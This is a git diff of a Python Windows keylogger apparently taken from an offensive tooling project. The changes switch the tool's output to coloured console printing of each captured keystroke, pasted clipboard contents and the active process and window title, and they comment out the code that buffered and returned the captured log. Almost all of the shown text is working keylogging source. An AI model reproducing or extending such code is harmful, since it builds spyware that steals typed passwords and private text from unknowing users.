@@ -63,7 +63,7 @@ class KeyLogger:
             except UnicodeDecodeError as e:
                 print(f'{e}: window name unknown')
             
-            print('\n', processID, executable.value.decode(), self.currentWindow)
+            print(f"\n[{bcolors.WARNING}%{bcolors.ENDC}] [{bcolors.WARNING}" + processID + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(executable.value.decode()) + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(self.currentWindow) + f"{bcolors.ENDC}]\n")
             
             windll.kernel32.CloseHandle(hwnd)
             windll.kernel32.CloseHandle(hProcess)
@@ -81,15 +81,16 @@ class KeyLogger:
             
             # Identify what key it was
             if 32 < event.Ascii < 127:
-                print(chr(event.Ascii), end='')
+                keyPressed = str(chr(event.Ascii))
+                print(f" [{bcolors.OKCYAN}" + keyPressed + f"{bcolors.ENDC}]", end='')
             else:
                 if event.Key == 'V':
                     win32clipboard.OpenClipboard()
                     value = win32clipboard.GetClipboardData()
                     win32clipboard.CloseClipboard()
-                    print(f'[PASTE] - {value}')
+                    print(f"[{bcolors.OKCYAN}PASTE{bcolors.ENDC}] - [{bcolors.OKCYAN}" + value + f"{bcolors.ENDC}]")
                 else:
-                    print(f'{event.Key}')
+                    print(f"[{bcolors.OKCYAN}" + str(event.Key) + f"{bcolors.ENDC}]")
             
             return True
 
@@ -103,8 +104,8 @@ def run():
     try:
 
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating output log...")
-        saveStdout = sys.stdout
-        sys.stdout = StringIO()
+        # saveStdout = sys.stdout
+        # sys.stdout = StringIO()
         
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating logger object...")
         kl = KeyLogger()
@@ -123,10 +124,9 @@ def run():
             pythoncom.PumpWaitingMessages()
             
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Saving log...")
-        log = sys.stdout.getvalue()
-        sys.stdout = save_stdout
-        
-        return log
+        # log = sys.stdout.getvalue()
+        # sys.stdout = save_stdout
+        # return log
     
     except Exception as e:
         print(str(e))
